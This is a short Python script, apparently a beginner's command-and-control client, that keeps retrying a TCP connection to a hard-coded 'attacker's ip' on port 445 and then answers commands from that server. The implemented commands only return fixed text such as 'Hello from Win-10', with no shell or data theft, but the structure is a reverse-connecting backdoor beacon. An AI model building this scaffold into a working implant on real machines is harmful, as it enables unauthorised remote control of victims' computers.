import socket
import time
import random
import os


def getInstructions(s):
	while True:
		msg = s.recv(4096)
		cmd = msg.decode("UTF-8")
		if cmd == "help":
			try:
				info = "Keywords/cmd: help, test, hie"
				s.send(info.encode("UTF-8"))
			except:
				pass
		elif cmd == "test":
			try:
				info = "It's working..."
				s.send(info.encode("UTF-8"))
			except:
				pass
		elif cmd == 'hie':
			try:
				info = "Hello from Win-10"
				s.send(info.encode("UTF-8"))
			except:
				pass


def main():	
	#Variables
	server_ip = "192.168.106.255"  #Server IP atacker's ip
	port      = 445                         #Connection Port
	#Connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connected = False
	while connected == False:
		try:
			s.connect((server_ip, port))
			connected = True
			print("[+] Connection established...")
		except:
			print("[+] Trying to connect...")
			time.sleep(10)
			continue
	getInstructions(s)

	
if __name__ == "__main__":
	main()
